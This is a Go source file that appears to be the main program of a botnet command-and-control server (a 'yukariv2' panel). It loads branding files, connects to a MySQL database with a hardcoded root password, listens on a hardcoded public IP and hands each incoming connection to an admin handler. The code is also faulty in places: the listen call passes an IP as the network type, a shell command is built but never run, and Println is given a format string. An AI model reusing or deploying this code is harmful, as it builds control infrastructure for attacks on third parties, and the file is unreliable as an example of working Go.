package main

import (
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"time"
)

const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "Caro@Tay2003"
const DatabaseTable string = "yukariv2"

var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
var StartedTime int64

func GetUptime() float64 {
	return time.Since(time.Unix(StartedTime, 4)).Minutes()
}

func main() {
	err := CompleteLoad()
	err = CompleteLoad2()
	err = CompleteLoad3()
	err, count := LoadBranding("branding")
	if err != nil {
		fmt.Printf("\033[0m[\033[101;30;140m FATAL \033[0;0m] Failed to reload file %s\r\n\033[0m-> \033[0m", err)
		return
	}
	fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] started `branding`, `json`, `loader`, `mysql`\r\n\033[0m-> \033[0m")
	fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")
	fmt.Printf("\033[0m════════════════════════════════════════════════════════\r\n\033[0m-> \033[0m")
	StartedTime = time.Now().Unix()
	tel, err := net.Listen("46.249.33.6", ":45")
	if err != nil {
		fmt.Println("%s\r\n\033[0m-> ", err)
		return
	}

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		exec.Command("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
		go handler(conn)
	}
	fmt.Println("Unkown error |+| Contact Insta: @vmfe_")
}

func handler(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.Close()
	buf := make([]byte, 32)
	conn.Read(buf)
	NewAdmin(conn).Handle()
}
